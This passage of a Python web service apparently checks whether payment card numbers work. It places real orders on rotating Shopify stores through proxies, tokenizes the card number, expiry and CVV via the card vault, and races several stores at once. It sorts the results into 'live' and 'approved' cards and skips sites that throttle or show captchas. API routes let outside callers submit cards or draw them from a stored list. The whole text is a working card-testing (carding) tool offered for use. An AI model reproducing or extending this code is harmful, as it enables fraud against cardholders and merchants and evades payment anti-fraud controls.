                    "deliveryStrategyByHandle": {"handle": delivery_strategy, "customDeliveryRate": False},
                    "options": {},
                },
                "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                "expectedTotalPrice": {"value": {"amount": str(shipping_amount), "currencyCode": currency}},
                "destinationChanged": False,
            })
            deliv_vars["payment"]["billingAddress"] = {"streetAddress": {
                "address1": street, "address2": "", "city": city,
                "countryCode": country_code, "postalCode": s_zip,
                "firstName": first, "lastName": last,
                "zoneCode": state, "phone": phone,
            }}
            deliv_vars["taxes"]["proposedTotalAmount"] = {"value": {"amount": str(tax_amount), "currencyCode": currency}}
            deliv_vars["buyerIdentity"]["shopPayOptInPhone"] = {"number": phone, "countryCode": country_code}
            if checkpoint_data:
                deliv_vars["checkpointData"] = checkpoint_data

            try:
                dr = await session.post(graphql_url,
                    params={"operationName": "Proposal"},
                    headers=gql_headers,
                    json={"query": QUERY_PROPOSAL_DELIVERY, "variables": deliv_vars,
                          "operationName": "Proposal"})
                d_resp = orjson.loads(dr.content)
                _del_sst = dr.headers.get("x-checkout-one-session-token")
                if _del_sst:
                    sst = _del_sst
                    gql_headers["x-checkout-one-session-token"] = sst
                d_result = (d_resp.get("data", {}).get("session", {})
                            .get("negotiate", {}).get("result", {}))
                if d_result:
                    d_typename = d_result.get("__typename", "")
                    if d_typename == "SubmittedForCompletion":
                        return _r("NO_PAYMENT_REQUIRED",
                                  message="Order auto-submitted before card entry", is_site_error=True)
                    d_seller = d_result.get("sellerProposal") or {}
                    d_total = d_seller.get("total") or d_seller.get("runningTotal") or {}
                    d_amt = d_total.get("value", {}).get("amount") or d_total.get("amount")
                    if d_amt:
                        running_total = d_amt
                        try:
                            price = f"{float(running_total):.2f}"
                        except (ValueError, TypeError):
                            pass
                    d_delivery = d_seller.get("delivery") or {}
                    if d_delivery.get("__typename") == "FilledDeliveryTerms":
                        d_d_lines = d_delivery.get("deliveryLines") or []
                        if d_d_lines:
                            d_strategies = d_d_lines[0].get("availableDeliveryStrategies") or []
                            d_selected = d_d_lines[0].get("selectedDeliveryStrategy") or {}
                            if d_selected.get("handle"):
                                delivery_strategy = d_selected["handle"]
                            elif d_strategies:
                                delivery_strategy = d_strategies[0].get("handle", delivery_strategy)
                            if d_strategies:
                                d_ship_amt = d_strategies[0].get("amount") or {}
                                try:
                                    shipping_amount = float(
                                        d_ship_amt.get("value", {}).get("amount") or
                                        d_ship_amt.get("amount") or "0")
                                except (ValueError, TypeError):
                                    pass
                    d_tax = d_seller.get("tax") or {}
                    if d_tax.get("__typename") == "FilledTaxTerms":
                        d_tax_amt = d_tax.get("totalTaxAmount") or {}
                        try:
                            tax_amount = float(
                                d_tax_amt.get("value", {}).get("amount") or
                                d_tax_amt.get("amount") or "0")
                        except (ValueError, TypeError):
                            pass
            except Exception as ex:
                if _looks_like_proxy_error(str(ex)):
                    return _r("PROXY_ERROR", message=str(ex)[:120], proxy_dead=True, is_site_error=True)
                log.warning("delivery proposal failed for %s: %s", hostname, ex)

            if not delivery_strategy:
                return _r("NO_SELLER_PROPOSAL",
                          message="No delivery strategy from shipping/delivery proposal", is_site_error=True)

            vault_payload = {
                "credit_card": {
                    "number": cc, "month": int(month),
                    "year": int(f"20{year}"),
                    "verification_value": cvv,
                    "name": f"{first} {last}",
                    "start_month": None, "start_year": None,
                    "issue_number": "",
                },
                "payment_session_scope": hostname,
            }
            vault_headers = {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
                "Origin": "https://checkout.pci.shopifyinc.com",
                "User-Agent": ua,
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
            }
            if ident_sig:
                vault_headers["shopify-identification-signature"] = ident_sig

            token = None
            for vault_url in [
                "https://checkout.pci.shopifyinc.com/sessions",
                "https://deposit.shopifyinc.com/sessions",
            ]:
                try:
                    vr = await session.post(vault_url, json=vault_payload, headers=vault_headers)
                    vd = orjson.loads(vr.content)
                    token = vd.get("id")
                    if token:
                        break
                except Exception as ex:
                    if _looks_like_proxy_error(str(ex)):
                        return _r("PROXY_ERROR", message=str(ex)[:120], proxy_dead=True, is_site_error=True)
                    continue

            if not token:
                return _r("TOKENIZATION_FAILED",
                          message="Card vault rejected tokenization", is_site_error=True)

            billing_addr = {"streetAddress": {
                "address1": street, "address2": "", "city": city,
                "countryCode": country_code, "postalCode": s_zip,
                "firstName": first, "lastName": last,
                "zoneCode": state, "phone": phone,
            }}

            def _build_submit_body() -> dict:
                submit_deliv_line = copy.deepcopy(deliv_vars["delivery"]["deliveryLines"][0])
                submit_deliv_line["selectedDeliveryStrategy"] = {
                    "deliveryStrategyByHandle": {"handle": delivery_strategy, "customDeliveryRate": False},
                    "options": {"phone": phone},
                }
                submit_deliv_line["expectedTotalPrice"] = {"any": True}
                submit_merch = copy.deepcopy(deliv_vars["merchandise"])
                for ml in submit_merch.get("merchandiseLines", []):
                    ml["expectedTotalPrice"] = {"any": True}
                return {
                    "query": MUTATION_SUBMIT,
                    "variables": {
                        "input": {
                            "sessionInput": {"sessionToken": sst},
                            "queueToken": queue_token or "",
                            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                            "delivery": {
                                "deliveryLines": [submit_deliv_line],
                                "noDeliveryRequired": [],
                                "useProgressiveRates": True,
                                "prefetchShippingRatesStrategy": None,
                                "supportsSplitShipping": True,
                            },
                            "merchandise": submit_merch,
                            "payment": {
                                "totalAmount": {"any": True},
                                "paymentLines": [{
                                    "paymentMethod": {"directPaymentMethod": {
                                        "paymentMethodIdentifier": payment_identifier,
                                        "sessionId": token,
                                        "billingAddress": billing_addr,
                                        "cardSource": None,
                                    }},
                                    "amount": {"any": True},
                                    "dueAt": None,
                                }],
                                "billingAddress": billing_addr,
                            },
                            "buyerIdentity": copy.deepcopy(deliv_vars["buyerIdentity"]),
                            "taxes": {
                                "proposedAllocations": None,
                                "proposedTotalAmount": {"any": True},
                                "proposedTotalIncludedAmount": None,
                                "proposedMixedStateTotalAmount": None,
                                "proposedExemptions": [],
                            },
                            "tip": {"tipLines": []},
                            "note": {"message": None, "customAttributes": []},
                            "localizationExtension": {"fields": []},
                            "nonNegotiableTerms": None,
                            "optionalDuties": {"buyerRefusesDuties": False},
                            **({"checkpointData": checkpoint_data} if checkpoint_data else {}),
                        },
                        "attemptToken": attempt_token,
                        "metafields": [],
                        "analytics": {"requestUrl": checkout_url},
                    },
                    "operationName": "SubmitForCompletion",
                }

            s_resp: dict = {}
            s_data: dict = {}
            for submit_attempt in range(3):
                try:
                    sr = await session.post(graphql_url,
                        params={"operationName": "SubmitForCompletion"},
                        headers=gql_headers, json=_build_submit_body())
                    s_resp = orjson.loads(sr.content)
                    _sub_sst = sr.headers.get("x-checkout-one-session-token")
                    if _sub_sst:
                        sst = _sub_sst
                        gql_headers["x-checkout-one-session-token"] = sst
                except (asyncio.TimeoutError, RequestsError) as ex:
                    if _looks_like_proxy_error(str(ex)):
                        return _r("PROXY_ERROR", message=str(ex)[:120], proxy_dead=True, is_site_error=True)
                    return _r("TIMEOUT", message="Submit timed out", is_site_error=True)
                except Exception as ex:
                    if _looks_like_proxy_error(str(ex)):
                        return _r("PROXY_ERROR", message=str(ex)[:120], proxy_dead=True, is_site_error=True)
                    return _r("SUBMIT_FAILED", message=str(ex)[:100], is_site_error=True)

                s_data = (s_resp.get("data") or {}).get("submitForCompletion") or {}
                if not s_data:
                    errs = s_resp.get("errors") or []
                    if errs:
                        for err_item in errs:
                            for fld in ("code", "message"):
                                val = str(err_item.get(fld) or "").upper()
                                if val:
                                    norm = _normalize_response(val)
                                    if norm != "CARD_DECLINED":
                                        approved = "True" if norm in ("INSUFFICIENT_FUNDS",
                                                                       "INVALID_CVC",
                                                                       "3DS_REQUIRED") else "False"
                                        return _r(norm, approved=approved, message=val[:120])
                    return _r("GRAPHQL_ERROR", message="Empty submit response", is_site_error=True)

                stype = s_data.get("__typename", "")
                if stype == "SubmitRejected":
                    sub_errs = s_data.get("errors") or []
                    all_confirmable = all(
                        e.get("__typename") == "ConfirmChangeViolation" for e in sub_errs
                    ) if sub_errs else False
                    if all_confirmable and submit_attempt < 2:
                        await asyncio.sleep(0.5)
                        continue
                if stype == "SubmitFailed" and submit_attempt < 2:
                    reason_txt = str(s_data.get("reason") or "").upper()
                    if any(k in reason_txt for k in ("TIMEOUT", "TRY_AGAIN",
                                                       "ORDER_CREATION",
                                                       "INTERNAL", "PROCESSING")):
                        await asyncio.sleep(0.6)
                        continue
                break

            stype = s_data.get("__typename", "")

            if stype in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                receipt = s_data.get("receipt") or {}
                rtype = receipt.get("__typename", "")
                if rtype == "ProcessedReceipt":
                    return _r("ORDER_PLACED", charged="True", approved="True",
                              message="Order placed successfully")
                if rtype == "ActionRequiredReceipt":
                    return _r("3DS_REQUIRED", approved="True", message="3D Secure challenge required")
                if rtype == "FailedReceipt":
                    pe = receipt.get("processingError") or {}
                    pe_type = pe.get("__typename", "")
                    if pe_type in ("InventoryClaimFailure", "InventoryReservationFailure"):
                        return _r("NO_PRODUCT", message="Inventory failure", is_site_error=True)
                    if pe_type == "OrderCreationFailure":
                        return _r("ORDER_CREATION_FAILED", message="Order creation failure", is_site_error=True)
                    code = str(pe.get("code") or "").upper()
                    msg = str(pe.get("messageUntranslated") or "").upper()
                    raw = code if code and code not in ("GENERIC_ERROR", "") else msg
                    norm = _normalize_response(raw) if raw else "CARD_DECLINED"
                    approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC",
                                                   "3DS_REQUIRED") else "False"
                    return _r(norm, approved=approved, message=(code or msg or norm)[:120])

                rid = receipt.get("id")
                if rid:
                    poll_body = {
                        "query": QUERY_POLL,
                        "variables": {"receiptId": rid, "sessionToken": sst},
                        "operationName": "PollForReceipt",
                    }
                    await asyncio.sleep(2)
                    for _ in range(6):
                        try:
                            pr = await session.post(graphql_url,
                                params={"operationName": "PollForReceipt"},
                                headers=gql_headers, json=poll_body)
                            pd = (orjson.loads(pr.content)).get("data", {}).get("receipt") or {}
                            pt = pd.get("__typename", "")
                            if pt == "ProcessedReceipt":
                                return _r("ORDER_PLACED", charged="True", approved="True",
                                          message="Order placed successfully")
                            if pt == "ActionRequiredReceipt":
                                return _r("3DS_REQUIRED", approved="True",
                                          message="3D Secure challenge required")
                            if pt == "FailedReceipt":
                                pe = pd.get("processingError") or {}
                                pe_type = pe.get("__typename", "")
                                if pe_type in ("InventoryClaimFailure", "InventoryReservationFailure"):
                                    return _r("NO_PRODUCT", message="Inventory failure", is_site_error=True)
                                code = str(pe.get("code") or "").upper()
                                msg = str(pe.get("messageUntranslated") or "").upper()
                                if code == "CAPTCHA_REQUIRED":
                                    return _r("CAPTCHA_REQUIRED", approved="False",
                                              message="Captcha required", is_site_error=True)
                                raw = code if code and code not in ("GENERIC_ERROR", "") else msg
                                norm = _normalize_response(raw) if raw else "CARD_DECLINED"
                                approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC",
                                                               "3DS_REQUIRED") else "False"
                                return _r(norm, approved=approved,
                                          message=(code or msg or norm)[:120])
                            if pt in ("ProcessingReceipt", "WaitingReceipt"):
                                delay = pd.get("pollDelay", 3000) / 1000
                                await asyncio.sleep(min(delay, 4))
                                continue
                        except Exception:
                            pass
                        break

                return _r("CARD_DECLINED", message="Unclassified receipt response")

            if stype == "SubmitFailed":
                reason = str(s_data.get("reason") or "")
                return _r(_normalize_response(reason), message=reason[:120])

            if stype == "SubmitRejected":
                errs = s_data.get("errors") or []
                if errs:
                    best_code = "CARD_DECLINED"
                    best_msg = ""
                    for err_item in errs:
                        for fld in ("code", "nonLocalizedMessage", "localizedMessage",
                                    "localizedMessageHtml"):
                            val = str(err_item.get(fld) or "").upper()
                            if not val or val in ("GENERIC_ERROR", "PAYMENT_FAILED", "PAYMENT ERROR"):
                                continue
                            norm = _normalize_response(val)
                            if norm != "CARD_DECLINED":
                                best_code = norm
                                best_msg = val
                                break
                        if best_code != "CARD_DECLINED":
                            break
                    approved = "True" if best_code in ("INSUFFICIENT_FUNDS", "INVALID_CVC",
                                                       "3DS_REQUIRED") else "False"
                    return _r(best_code, approved=approved, message=(best_msg or best_code)[:120])
                return _r("CARD_DECLINED", message="No error detail")

            if stype == "Throttled":
                return _r("THROTTLED", message="Throttled by Shopify", is_site_error=True)
            if stype == "CheckpointDenied":
                return _r("CHECKPOINTDENIED", message="Checkpoint denied", is_site_error=True)

            return _r("CARD_DECLINED", message=f"Unknown submit type: {stype}")

        except (asyncio.TimeoutError, RequestsError) as ex:
            if _looks_like_proxy_error(str(ex)):
                return _r("PROXY_ERROR", message=str(ex)[:120], proxy_dead=True, is_site_error=True)
            return _r("TIMEOUT", message="Request timed out", is_site_error=True)
        except Exception as ex:
            log.debug("validate_card exception: %s", ex, exc_info=True)
            err_str = f"{type(ex).__name__}: {str(ex)[:100]}"
            if _looks_like_proxy_error(err_str):
                return _r("PROXY_ERROR", message=err_str, proxy_dead=True, is_site_error=True)
            return _r("SITE_ERROR", message=err_str, is_site_error=True)
        finally:
            if owned:
                res = session.close()
                if asyncio.iscoroutine(res):
                    await res


# ---------------------------------------------------------------------------
# Auto-validate
# ---------------------------------------------------------------------------
async def _auto_validate(
    cc: str, month: str, year: str, cvv: str,
    proxy_str: Optional[str] = None,
    max_price: Optional[float] = None,
    max_attempts: int = AUTO_ATTEMPTS,
    exclude: Optional[list[str]] = None,
    pool: Optional[list[str]] = None,
) -> dict:
    exclude_set = set(exclude or [])
    t0 = time.time()

    _stats["auto_total_cards"] += 1

    source_pool = list(pool) if pool is not None else list(_site_pool)

    if pool is not None:
        _stats["auto_request_pool_used"] += 1
        _stats[f"auto_request_pool_size_{min(len(pool), 50)}"] += 1
    else:
        _stats["auto_file_pool_used"] += 1

    if not source_pool:
        return {
            "Response": "SITE_ERROR",
            "Message": "Pool is empty — no sites provided",
            "Status": False, "Gateway": "Shopify Payments",
            "Price": "0.00", "Proxy": "Live", "Retry": True,
            "Time": f"{round(time.time() - t0, 2)}s",
        }

    candidates: list[str] = []
    skip_reasons: dict[str, int] = {}
    for site in source_pool:
        if site in exclude_set:
            continue
        host = urlparse(site if site.startswith("http") else f"https://{site}").netloc

        pc = _product_cache.get(host)
        if pc and pc.get("err") == "THROTTLED":
            expiry = pc.get("expires_at", pc.get("ts", 0) + CACHE_TTL)
            if time.time() < expiry:
                skip_reasons["THROTTLED"] = skip_reasons.get("THROTTLED", 0) + 1
                continue

        usable, reason = _site_usable(host)
        if usable:
            candidates.append(site)
        else:
            code = reason.split(":")[0].strip() if ":" in reason else reason
            skip_reasons[code] = skip_reasons.get(code, 0) + 1

    if not candidates:
        if not skip_reasons:
            return {
                "Response": "SITE_ERROR", "Message": "All sites excluded",
                "Status": False, "Gateway": "Shopify Payments",
                "Price": "0.00", "Proxy": "Live", "Retry": True,
                "Time": f"{round(time.time() - t0, 2)}s",
            }

        # Soft exhausted: force-try 3 soonest-to-recover sites
        _stats["auto_soft_exhausted"] += 1
        now = time.time()

        def _expires_in(s: str) -> float:
            host = urlparse(s if s.startswith("http") else f"https://{s}").netloc
            q = _site_quarantine.get(host, {})
            return min(
                max(0, q.get("throttled_until", 0) - now),
                max(0, q.get("has_products_checked_at", 0) + NO_PRODUCT_TTL - now),
                max(0, q.get("captcha_checked_at", 0) + NO_PRODUCT_TTL - now),
                max(0, q.get("session_checked_at", 0) + SESSION_FAIL_TTL - now),
            )

        recovery_pool = sorted(
            (s for s in source_pool if s not in exclude_set),
            key=_expires_in,
        )[:3]

        log.warning(
            "[auto] pool empty (%s) — forcing %d soonest-to-recover sites",
            ", ".join(f"{k}:{v}" for k, v in skip_reasons.items()),
            len(recovery_pool),
        )
        candidates = recovery_pool

    random.shuffle(candidates)
    candidates = candidates[:max_attempts]

    last_result: Optional[dict] = None
    last_site: Optional[str] = None
    attempted = 0

    for site in candidates:
        attempted += 1
        _stats["auto_total_attempts"] += 1

        result = await validate_card(
            cc, month, year, cvv, site,
            proxy_str=proxy_str, max_price=max_price,
        )
        last_result = result
        last_site = site

        host = urlparse(result.get("Site") or site).netloc
        code = str(result.get("Response", "")).upper()

        _stats[f"auto_site_{code}"] += 1

        if code not in HARD_DEAD_CODES and code not in PROXY_STOP_CODES:
            _record_site_result(host, code)

        if code in FINAL_CODES:
            if attempted == 1:
                _stats["auto_first_try_success"] += 1
            log.info("[auto] SUCCESS on %s after %d attempt(s): %s", host, attempted, code)
            return result

        if code in PROXY_STOP_CODES:
            _stats[f"auto_early_exit_{code}"] += 1
            log.info("[auto] %s on %s — returning so bot rotates proxy", code, host)
            return result

        log.info("[auto] attempt %d/%d: %s -> %s, trying next site",
                 attempted, len(candidates), host, code)

    log.warning("[auto] pool exhausted after %d attempt(s) — last site: %s, last code: %s",
                attempted, last_site, last_result.get("Response") if last_result else "?")
    return {
        "Response": "SITE_ERROR",
        "Message": f"All {attempted} sites exhausted (site errors only)",
        "Status": False, "Gateway": "Shopify Payments",
        "Price": "0.00",
        "Proxy": last_result.get("Proxy", "Live") if last_result else "Live",
        "Retry": True,
        "Time": f"{round(time.time() - t0, 2)}s",
    }


# ---------------------------------------------------------------------------
# Multi-site racing
# ---------------------------------------------------------------------------
async def validate_card_raced(
    cc: str, month: str, year: str, cvv: str,
    sites: list[str],
    proxy_str: Optional[str] = None,
    max_price: Optional[float] = None,
    race_count: int = RACE_COUNT,
) -> dict:
    if not sites:
        return {"Response": "SITE_ERROR", "Message": "No sites provided",
                "Status": False, "Retry": True}

    live_sites = [s for s in sites if _site_usable(urlparse(
        s if s.startswith("http") else f"https://{s}").netloc)[0]]
    pool = live_sites if live_sites else sites
    random.shuffle(pool)
    picked = pool[: max(1, race_count)]

    tasks = [
        asyncio.create_task(validate_card(
            cc, month, year, cvv, s, proxy_str=proxy_str, max_price=max_price,
        ))
        for s in picked
    ]

    last_result: Optional[dict] = None
    try:
        for coro in asyncio.as_completed(tasks):
            try:
                res = await coro
            except Exception:
                continue
            last_result = res
            code = str(res.get("Response", "")).upper()
            if code not in SITE_ERROR_CODES:
                for t in tasks:
                    if not t.done():
                        t.cancel()
                return res
        return last_result or {
            "Response": "SITE_ERROR", "Message": "All raced sites failed",
            "Status": False, "Retry": True,
        }
    finally:
        for t in tasks:
            if not t.done():
                t.cancel()


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------
@app.get("/shopify")
async def shopify_route(
    site:           Optional[str] = Query(None),
    cc:             Optional[str] = Query(None),
    proxy:          Optional[str] = Query(None),
    max_price:      Optional[float] = Query(None),
    key:            Optional[str] = Query(None),
    fallback_sites: Optional[str] = Query(None),
    attempts:       Optional[int] = Query(None),
    auto:           Optional[bool] = Query(None),
):
    if VALID_API_KEYS and (not key or key not in VALID_API_KEYS):
        return JSONResponse(
            {"error": "Invalid or missing API key", "Response": "API_AUTH_ERROR"},
            status_code=401)

    if cc:
        card = _parse_card(cc)
        if not card:
            return JSONResponse({"error": "Bad card format."}, status_code=400)
    else:
        cards = _get_cards()
        if not cards:
            return JSONResponse({"error": "No cards available."}, status_code=400)
        card = random.choice(cards)

    n_attempts = attempts if attempts and attempts > 0 else AUTO_ATTEMPTS

    request_pool: Optional[list[str]] = None
    if fallback_sites:
        parsed = [s.strip() for s in fallback_sites.split(",") if s.strip()]
        if site and site not in parsed:
            parsed.insert(0, site)
        if parsed:
            request_pool = parsed

    if auto is True or not site:
        result = await _auto_validate(
            card["cc"], card["month"], card["year"], card["cvv"],
            proxy_str=proxy, max_price=max_price, max_attempts=n_attempts,
            pool=request_pool,
        )
        _stats[f"auto_response_{result.get('Response', 'UNKNOWN')}"] += 1
        return JSONResponse(result)

    primary = await validate_card(
        card["cc"], card["month"], card["year"], card["cvv"],
        site, proxy_str=proxy, max_price=max_price,
    )
    primary_host = urlparse(primary.get("Site") or site).netloc
    primary_code = str(primary.get("Response", "")).upper()
    if primary_code not in PROXY_STOP_CODES:
        _record_site_result(primary_host, primary_code)

    if primary_code in FINAL_CODES or primary_code in PROXY_STOP_CODES:
        _stats[f"response_{primary_code}"] += 1
        return JSONResponse(primary)

    log.info("[shopify] primary %s -> %s, falling back to auto pool",
             primary_host, primary_code)

    result = await _auto_validate(
        card["cc"], card["month"], card["year"], card["cvv"],
        proxy_str=proxy, max_price=max_price, max_attempts=n_attempts,
        exclude=[site], pool=request_pool,
    )
    _stats[f"auto_response_{result.get('Response', 'UNKNOWN')}"] += 1
    return JSONResponse(result)


@app.get("/shopify-race")
async def shopify_race_route(
    sites:     str = Query(...),
    cc:        Optional[str] = Query(None),
    proxy:     Optional[str] = Query(None),
    max_price: Optional[float] = Query(None),
    race:      Optional[int] = Query(None),
    key:       Optional[str] = Query(None),
):
    if VALID_API_KEYS and (not key or key not in VALID_API_KEYS):
        return JSONResponse(
            {"error": "Invalid or missing API key", "Response": "API_AUTH_ERROR"},
            status_code=401)

    site_list = [s.strip() for s in sites.split(",") if s.strip()]
    if not site_list:
        return JSONResponse({"error": "No valid sites"}, status_code=400)

    if cc:
        card = _parse_card(cc)
        if not card:
            return JSONResponse({"error": "Bad card format."}, status_code=400)
    else:
        cards = _get_cards()
        if not cards:
            return JSONResponse({"error": "No cards available."}, status_code=400)
        card = random.choice(cards)

    race_n = race if race and race > 0 else RACE_COUNT
    result = await validate_card_raced(
        card["cc"], card["month"], card["year"], card["cvv"],
        site_list, proxy_str=proxy, max_price=max_price, race_count=race_n,
    )
    answered_site = result.get("Site", "")
    if answered_site:
        resp_code = result.get("Response", "UNKNOWN")
        if resp_code not in PROXY_STOP_CODES:
            _record_site_result(urlparse(answered_site).netloc, resp_code)
    _stats[f"race_response_{result.get('Response', 'UNKNOWN')}"] += 1
    return JSONResponse(result)


@app.get("/check")
async def check_route(
    site:      str = Query(...),
    card:      Optional[str] = Query(None),
    proxy:     Optional[str] = Query(None),
    max_price: Optional[float] = Query(None),
    key:       Optional[str] = Query(None),
):
    if VALID_API_KEYS and (not key or key not in VALID_API_KEYS):
        return JSONResponse(
            {"error": "Invalid or missing API key", "Response": "API_AUTH_ERROR"},
            status_code=401)
    if not site:
        return JSONResponse({"error": "Missing 'site' parameter"}, status_code=400)

    if card:
        parsed = _parse_card(card)
        if not parsed:
            return JSONResponse({"error": "Bad card format."}, status_code=400)
    else:
        cards = _get_cards()
        if not cards:
            return JSONResponse({"error": "No cards available."}, status_code=400)
        parsed = random.choice(cards)

    site = site.strip()
    ourl = site if site.startswith("http") else f"https://{site}"
    result = await validate_card(parsed["cc"], parsed["month"], parsed["year"],
                                  parsed["cvv"], ourl,
                                  proxy_str=proxy, max_price=max_price)
    response_code = result.get("Response", "")
    if response_code not in PROXY_STOP_CODES:
        _record_site_result(urlparse(ourl).netloc, response_code)
    _stats[f"response_{response_code or 'UNKNOWN'}"] += 1
    return JSONResponse({
        "valid":         response_code in LIVE_RESPONSES,
        "site":          site,
        "product":       result.get("Product", ""),
        "price":         result.get("Price", "0.00"),
        "card_response": response_code,
        "gate":          result.get("Gateway", "UNKNOWN"),
        "approved":      result.get("Approved", "False"),
        "charged":       result.get("Charged", "False"),
        "time":          result.get("Time", ""),
    })


@app.get("/auto-diagnostics")
async def auto_diagnostics_route():
    total_cards = _stats.get("auto_total_cards", 0)
    total_attempts = _stats.get("auto_total_attempts", 0)
    first_try_success = _stats.get("auto_first_try_success", 0)
    request_pool_used = _stats.get("auto_request_pool_used", 0)
    file_pool_used = _stats.get("auto_file_pool_used", 0)
    early_exit_proxy = _stats.get("auto_early_exit_PROXY_ERROR", 0)
    early_exit_throttled = _stats.get("auto_early_exit_THROTTLED", 0)
    soft_exhausted = _stats.get("auto_soft_exhausted", 0)

    code_breakdown = {}
    pool_size_distribution = {}
    pool_empty_breakdown = {}
    for k, v in _stats.items():
        if k.startswith("auto_site_"):
            code_breakdown[k[len("auto_site_"):]] = v
        elif k.startswith("auto_request_pool_size_"):
            pool_size_distribution[k[len("auto_request_pool_size_"):]] = v
        elif k.startswith("auto_pool_empty_"):
            pool_empty_breakdown[k[len("auto_pool_empty_"):]] = v

    live_pool = sum(
        1 for s in _site_pool
        if _site_usable(urlparse(
            s if s.startswith("http") else f"https://{s}"
        ).netloc)[0]
    )

    return JSONResponse({
        "total_cards_processed":   total_cards,
        "total_site_attempts":     total_attempts,
        "avg_attempts_per_card":   round(total_attempts / total_cards, 2) if total_cards else 0,
        "first_try_success":       first_try_success,
        "first_try_rate":          f"{first_try_success / total_cards * 100:.1f}%" if total_cards else "0%",
        "request_pool_used":       request_pool_used,
        "file_pool_used":          file_pool_used,
        "early_exit_proxy_error":  early_exit_proxy,
        "early_exit_throttled":    early_exit_throttled,
        "soft_exhausted":          soft_exhausted,
        "request_pool_sizes":      pool_size_distribution,
        "pool_empty_breakdown":    pool_empty_breakdown,
        "internal_site_codes":     code_breakdown,
        "file_pool_live":          live_pool,
        "file_pool_total":         len(_site_pool),
    })


@app.get("/site-stats")
async def site_stats_route():
    now = time.time()
    out = {}
    hosts = set(list(_site_stats.keys()) + list(_site_quarantine.keys()))

    for host in hosts:
        s = _site_stats.get(host, {})
        q = _site_quarantine.get(host, {})
        outcomes = list(s.get("outcomes", []))
        total = len(outcomes)
        errs = sum(outcomes) if outcomes else 0
        success_rate = (1 - errs / total) * 100 if total else None

        hp = q.get("has_products")
        hp_age = int(now - q["has_products_checked_at"]) if q.get("has_products_checked_at") else None
        last_seen_ago = int(now - q["last_seen"]) if q.get("last_seen") else None

        blacklisted = now < s.get("blacklisted_until", 0)
        cp = q.get("cheapest_price")
        cpa = q.get("cheapest_checked_at")
        hc = q.get("has_captcha")
        hca = q.get("captcha_checked_at")
        cs = q.get("can_create_session")
        csa = q.get("session_checked_at")
        throttled_until = q.get("throttled_until", 0)

        skip_reason = None
        if blacklisted:
            skip_reason = "blacklisted"
        elif now < throttled_until:
            skip_reason = f"throttled ({int(throttled_until - now)}s left)"
        elif hc is True and hca and (now - hca) < NO_PRODUCT_TTL:
            skip_reason = "captcha"
        elif cp is not None and cp > HARD_MAX_PRICE and cpa and (now - cpa) < NO_PRODUCT_TTL:
            skip_reason = f"price_too_high (${cp:.2f})"
        elif cs is False and csa and (now - csa) < SESSION_FAIL_TTL:
            skip_reason = "no_session_token"
        elif hp is False and (now - (q.get("has_products_checked_at") or 0)) < NO_PRODUCT_TTL:
            skip_reason = "no_products"

        out[host] = {
            "samples":              total,
            "success_rate":         f"{success_rate:.1f}%" if success_rate is not None else "N/A",
            "site_errors":          errs,
            "success_count":        s.get("success_count", 0),
            "error_count":          s.get("error_count", 0),
            "blacklisted":          blacklisted,
            "blacklist_remaining":  max(0, int(s.get("blacklisted_until", 0) - now)),
            "throttled":            now < throttled_until,
            "throttle_remaining":   max(0, int(throttled_until - now)),
            "has_products":         hp,
            "has_products_age_sec": hp_age,
            "cheapest_price":       cp,
            "cheapest_age_sec":     int(now - cpa) if cpa else None,
            "has_captcha":          hc,
            "captcha_age_sec":      int(now - hca) if hca else None,
            "can_create_session":   cs,
            "session_age_sec":      int(now - csa) if csa else None,
            "skip_reason":          skip_reason,
            "last_response":        q.get("last_response", ""),
            "last_seen_ago_sec":    last_seen_ago,
            "quarantine_hits":      q.get("count", 0),
            "live":                 skip_reason is None,
        }
    return JSONResponse(out)


@app.get("/healthy-sites")
async def healthy_sites_route(min_score: float = HEALTHY_MIN_SCORE):
    now = time.time()
    out = []
    seen = set()

    for site in _site_pool:
        host = urlparse(site if site.startswith("http") else f"https://{site}").netloc
        if host in seen:
            continue
        seen.add(host)

        s = _site_stats.get(host)
        q = _site_quarantine.get(host, {})

        if s and now < s.get("blacklisted_until", 0):
            continue
        if now < q.get("throttled_until", 0):
            continue

        hp = q.get("has_products")
        hpc = q.get("has_products_checked_at", 0)
        if hp is False and (now - hpc) < NO_PRODUCT_TTL:
            continue
        if q.get("has_captcha") is True and (now - q.get("captcha_checked_at", 0)) < NO_PRODUCT_TTL:
            continue

        cp = q.get("cheapest_price")
        cpa = q.get("cheapest_checked_at", 0)
        if cp is not None and cp > HARD_MAX_PRICE and (now - cpa) < NO_PRODUCT_TTL:
            continue
        if q.get("can_create_session") is False and (now - q.get("session_checked_at", 0)) < SESSION_FAIL_TTL:
            continue

        if s:
            outcomes = list(s.get("outcomes", []))
            if len(outcomes) >= 5:
                rate = 1 - (sum(outcomes) / len(outcomes))
                if rate < min_score:
                    continue

        out.append(site)

    return JSONResponse({
        "count":        len(out),
        "sites":        out,
        "total_pool":   len(_site_pool),
        "generated_at": datetime.datetime.utcnow().isoformat(),
    })


@app.get("/quarantine")
async def quarantine_route(min_hits: int = 3):
    out = {}
    for host, q in _site_quarantine.items():
        if q.get("count", 0) >= min_hits and q.get("last_response") in HARD_DEAD_CODES:
            out[host] = {
                "hits":          q["count"],
                "last_response": q["last_response"],
                "last_seen":     datetime.datetime.fromtimestamp(q["last_seen"]).isoformat(),
            }
    return JSONResponse(out)


@app.post("/skip-site")
async def skip_site_route(site: str = Query(...)):
    host = urlparse(site if site.startswith("http") else f"https://{site}").netloc
    q = _site_quarantine[host]
    q["count"] = q.get("count", 0) + 1
    q["last_response"] = "MANUAL_SKIP"
    q["last_seen"] = time.time()
    q["has_products"] = False
    q["has_products_checked_at"] = time.time()
    return JSONResponse({"skipped": host})


@app.post("/sync-sites")
async def sync_sites_route(
    request: Request,
    sites: Optional[str] = Query(None, description="Comma-separated site list"),
    key:   Optional[str] = Query(None),
):
    """
    Replace this replica's internal site pool with the bot-provided list.
    Called by shopify_api.push_sites_to_all_replicas() from the bot.

    Accepts both query string (?sites=a,b,c&key=...) and JSON body
    ({"sites": ["a","b"], "key": "..."}) — JSON preferred for large pools.
    """
    # Parse JSON body first
